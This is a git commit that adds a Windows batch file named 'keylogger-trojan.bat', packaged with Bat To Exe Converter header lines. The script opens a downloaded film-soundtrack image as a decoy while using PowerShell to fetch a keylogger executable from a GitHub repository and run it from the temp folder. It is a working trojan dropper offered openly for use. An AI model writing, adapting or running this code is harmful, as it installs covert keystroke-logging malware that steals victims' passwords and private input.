d718ec93d9a027326c0fa8fb9b7c86dc55a5e8c2
Mohammed Ragab Saad <103288444+MohammedRSaad@users.noreply.github.com>
2022-09-15 16:30:55 +0200

    Add files via upload

---
+++ keylogger-trojan.bat
@@ -0,0 +1,38 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFAhAWQCHMn+GIroL5uT07u6UnmQTV+cvbIbU1PqHI+9z
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFAhAWQCHMn+GIrAP4/z0/9aurE4YRPY2d4GWyrudNOUBpED8cPY=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://upload.wikimedia.org/wikipedia/en/1/18/Inception_OST.jpg' -OutFile Inception.jpg"
+Inception.jpg
+Powershell -Command "Invoke-WebRequest 'https://github.com/MohammedRSaad/Key-Logger/raw/main/keylogger/dist/keylogger.exe' -OutFile key.exe
+key.exe
